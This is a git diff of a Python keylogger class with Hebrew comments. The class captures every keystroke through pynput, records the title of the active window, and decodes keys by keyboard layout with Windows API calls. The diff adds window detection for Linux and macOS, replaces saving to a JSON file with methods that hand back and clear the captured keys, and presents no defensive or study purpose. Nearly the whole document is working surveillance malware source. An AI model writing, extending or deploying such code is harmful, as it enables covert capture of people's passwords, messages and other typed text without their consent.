@@ -1,9 +1,10 @@
 from pynput import keyboard
 import threading
 import ctypes
-from ctypes import wintypes
-import json
 import time
+import platform
+import subprocess
+from ctypes import wintypes
 
 
 class KeyLogger:
@@ -11,31 +12,35 @@ class KeyLogger:
         self.current_keys = []
         self.lock = threading.Lock()
         self.listener = None
-        self.user32 = ctypes.WinDLL('user32', use_last_error=True)
-        self.windows_api()
+        self.platform_system = platform.system()
+
+        if self.platform_system == "Windows":
+            self.user32 = ctypes.WinDLL('user32', use_last_error=True)
+            self.windows_api()
 
     def windows_api(self):
-        """הגדרת פונקציות ומבנים מ-Windows API"""
-        self.user32.GetForegroundWindow.restype = wintypes.HWND
-        self.user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
-        self.user32.GetWindowTextW.restype = wintypes.INT
-        self.user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
-        self.user32.GetWindowThreadProcessId.restype = wintypes.DWORD
-        self.user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
-        self.user32.GetKeyboardLayout.restype = wintypes.HKL
-        self.user32.ToUnicodeEx.argtypes = [
-            wintypes.UINT,  # wVirtKey
-            wintypes.UINT,  # wScanCode
-            ctypes.POINTER(wintypes.BYTE),  # lpKeyState
-            ctypes.POINTER(wintypes.WCHAR),  # pwszBuff
-            ctypes.c_int,  # cchBuff
-            wintypes.UINT,  # wFlags
-            wintypes.HKL  # dwhkl
-        ]
-        self.user32.ToUnicodeEx.restype = ctypes.c_int
-        self.user32.GetKeyboardState.argtypes = [ctypes.POINTER(wintypes.BYTE * 256)]
-        self.user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
-        self.user32.MapVirtualKeyExW.restype = wintypes.UINT
+        if self.platform_system == "Windows":
+            """הגדרת פונקציות ומבנים מ-Windows API"""
+            self.user32.GetForegroundWindow.restype = wintypes.HWND
+            self.user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
+            self.user32.GetWindowTextW.restype = wintypes.INT
+            self.user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
+            self.user32.GetWindowThreadProcessId.restype = wintypes.DWORD
+            self.user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
+            self.user32.GetKeyboardLayout.restype = wintypes.HKL
+            self.user32.ToUnicodeEx.argtypes = [
+                wintypes.UINT,  # wVirtKey
+                wintypes.UINT,  # wScanCode
+                ctypes.POINTER(wintypes.BYTE),  # lpKeyState
+                ctypes.POINTER(wintypes.WCHAR),  # pwszBuff
+                ctypes.c_int,  # cchBuff
+                wintypes.UINT,  # wFlags
+                wintypes.HKL  # dwhkl
+            ]
+            self.user32.ToUnicodeEx.restype = ctypes.c_int
+            self.user32.GetKeyboardState.argtypes = [ctypes.POINTER(wintypes.BYTE * 256)]
+            self.user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
+            self.user32.MapVirtualKeyExW.restype = wintypes.UINT
 
     def start_logging(self):
         """התחלת ההאזנה ללחיצות מקלדת"""
@@ -49,12 +54,35 @@ class KeyLogger:
             self.listener.stop()
 
     def get_active_window(self):
+        if self.platform_system == "Windows":
+            return self.get_active_window_windos()
+        elif self.platform_system == "Linux":
+            return self.get_active_window_linox()
+        elif self.platform_system == "Darwin":
+            return self.get_active_window_mac()
+        return "Unsupported OS"
+
+    def get_active_window_windos(self):
         """קבלת שם החלון הפעיל"""
         hwnd = self.user32.GetForegroundWindow()
         length = 256
         buffer = ctypes.create_unicode_buffer(length)
         self.user32.GetWindowTextW(hwnd, buffer, length)
         return buffer.value
+
+    def get_active_window_mac(self):
+        if self.platform_system == "Darwin":
+            from AppKit import NSWorkspace
+            """פונקציה שמחזירה את שם החלון הפעיל ב-macOS באמצעות NSWorkspace"""
+            return NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()
+
+    def get_active_window_linox(self):
+        """פונקציה שמחזירה את שם החלון הפעיל ב-Linux באמצעות הפקודה xdotool"""
+        try:
+            output = subprocess.check_output(["xdotool", "getwindowfocus", "getwindowname"])
+            return output.decode().strip()
+        except Exception:
+            return "Unknown Window"
 
     def get_keyboard_layout(self):
         """קבלת מזהה פריסת המקלדת הנוכחית"""
@@ -77,12 +105,29 @@ class KeyLogger:
                         self.current_keys[-1][window_name] += key_str
 
                     print(f"{window_name} : {key_str}")
-                    self.save_data()
             except Exception as e:
                 print(f"Error handling key: {e}")
 
     def _format_key(self, key):
         """תרגום המקש לתו לפי השפה הנוכחית"""
+        if self.platform_system == "Windows":
+            vk = scancode = None
+            if isinstance(key, keyboard.KeyCode):
+                vk = key.vk
+                current_hkl = self.get_keyboard_layout()
+                scancode = self.user32.MapVirtualKeyExW(vk, 0, current_hkl)
+            else:
+                return f"[{key.name}]"
+
+            keystate = (wintypes.BYTE * 256)()
+            self.user32.GetKeyboardState(ctypes.byref(keystate))
+            buff = ctypes.create_unicode_buffer(5)
+            ret = self.user32.ToUnicodeEx(vk, scancode, keystate, buff, 5, 0, current_hkl)
+
+            if ret > 0:
+                return buff.value[:ret]
+            return f"[{key.name}]"
+
         special_keys = {
             keyboard.Key.space: ' ',
             keyboard.Key.enter: '[ENTER]\n',
@@ -93,41 +138,14 @@ class KeyLogger:
         if key in special_keys:
             return special_keys[key]
 
-        vk = scancode = None
         if isinstance(key, keyboard.KeyCode):
-            vk = key.vk
-            current_hkl = self.get_keyboard_layout()
-            scancode = self.user32.MapVirtualKeyExW(vk, 0, current_hkl)
-        else:
-            return f"[{key.name}]"
+            return key.char if key.char else f"[{key.vk}]"
 
-        keystate = (wintypes.BYTE * 256)()
-        self.user32.GetKeyboardState(ctypes.byref(keystate))
-        buff = ctypes.create_unicode_buffer(5)
-        ret = self.user32.ToUnicodeEx(
-            vk,
-            scancode,
-            keystate,
-            buff,
-            5,
-            0,
-            self.get_keyboard_layout()
-        )
-
-        if ret > 0:
-            return buff.value[:ret]
         return f"[{key.name}]"
 
-    def save_data(self):
-        """שמירת הנתונים לקובץ JSON"""
-        with open("keylog_data.json", "w", encoding="utf-8") as f:
-            json.dump(self.current_keys, f, ensure_ascii=False, indent=4)
+    def get_logged_keys(self):
+        return self.current_keys
 
-#
-# if __name__ == "__main__":
-#     logger = KeyLogger().start_logging()
-#     try:
-#         while True:
-#             pass  # להמשיך לרוץ עד עצירה ידנית
-#     except KeyboardInterrupt:
-#         logger.stop_logging()
+    def clear_buffer(self):
+        self.current_keys = []
+
